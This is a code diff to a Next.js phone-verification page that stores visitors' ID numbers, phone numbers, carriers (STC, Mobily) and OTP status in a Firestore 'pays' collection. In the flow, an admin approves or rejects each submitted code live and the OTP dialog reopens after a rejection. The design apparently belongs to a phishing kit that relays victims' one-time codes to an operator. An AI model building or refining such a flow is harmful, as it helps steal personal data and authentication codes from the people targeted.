@@ -13,7 +13,7 @@ import { CarrierVerificationModal } from "@/components/carrier-verification-moda
 import { PhoneOtpDialog } from "@/components/dialog-b";
 
 import { db, setDoc, doc } from "@/lib/firebase";
-import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
+import { onSnapshot, Firestore } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
 
@@ -222,58 +222,6 @@ export default function VerifyPhonePage() {
     window.location.href = "/step4";
   };
 
-  const handleRejected = async () => {
-    // Admin rejected - close modal and allow re-entry
-    const visitorID = localStorage.getItem("visitor");
-    if (!visitorID) return;
-
-    try {
-      // Get current phone data
-      if (!db) return;
-      const docRef = doc(db as Firestore, "pays", visitorID);
-      const docSnap = await getDoc(docRef);
-
-      if (docSnap.exists()) {
-        const data = docSnap.data();
-        const currentPhoneData = {
-          idNumber: data.phoneIdNumber || "",
-          phoneNumber: data.phoneNumber,
-          phoneCarrier: data.phoneCarrier,
-          rejectedAt: new Date().toISOString(),
-        };
-
-        // Save rejected phone data and reset status
-        await setDoc(
-          docRef,
-          {
-            oldPhoneInfo: data.oldPhoneInfo
-              ? [...data.oldPhoneInfo, currentPhoneData]
-              : [currentPhoneData],
-            phoneOtpStatus: "pending",
-            phoneCarrier: "", // Clear carrier to allow re-selection
-          },
-          { merge: true }
-        );
-      }
-    } catch (error) {
-      console.error("Error saving rejected phone data:", error);
-    }
-
-    // Close all modals
-    setShowStcModal(false);
-    setShowMobilyModal(false);
-    setShowCarrierModal(false);
-
-    // Reset form
-    setPhoneNumber("");
-    setSelectedCarrier("");
-
-    toast.error("تم رفض رقم الهاتف", {
-      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
-      duration: 5000,
-    });
-  };
-
   const handleOtpRejected = () => {
     // Admin rejected OTP - close waiting modals and reopen OTP dialog with error
     console.log("[step5] Phone OTP rejected, reopening dialog with error");
@@ -282,6 +230,7 @@ export default function VerifyPhonePage() {
     setShowStcModal(false);
     setShowMobilyModal(false);
     setShowCarrierModal(false);
+    setShowPhoneOtpDialog(false);
 
     // Store error in localStorage so it persists across modal close/open
     localStorage.setItem(
@@ -292,8 +241,10 @@ export default function VerifyPhonePage() {
     // Set error message in state as well
     setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
 
-    // Reopen OTP dialog
-    setShowPhoneOtpDialog(true);
+    // Reopen OTP dialog after waiting modals close to avoid dialog stacking issues
+    window.setTimeout(() => {
+      setShowPhoneOtpDialog(true);
+    }, 50);
   };
 
   const handleShowWaitingModal = (carrier: string) => {
@@ -469,7 +420,7 @@ export default function VerifyPhonePage() {
         open={showStcModal}
         visitorId={visitorId}
         onApproved={handleApproved}
-        onRejected={handleRejected}
+        onRejected={handleOtpRejected}
       />
 
       {/* Mobily Verification Modal */}
@@ -477,7 +428,7 @@ export default function VerifyPhonePage() {
         open={showMobilyModal}
         visitorId={visitorId}
         onApproved={handleApproved}
-        onRejected={handleRejected}
+        onRejected={handleOtpRejected}
       />
 
       {/* Other Carriers Verification Modal */}
@@ -485,7 +436,7 @@ export default function VerifyPhonePage() {
         open={showCarrierModal}
         visitorId={visitorId}
         onApproved={handleApproved}
-        onRejected={handleRejected}
+        onRejected={handleOtpRejected}
       />
 
       {/* Phone OTP Dialog */}
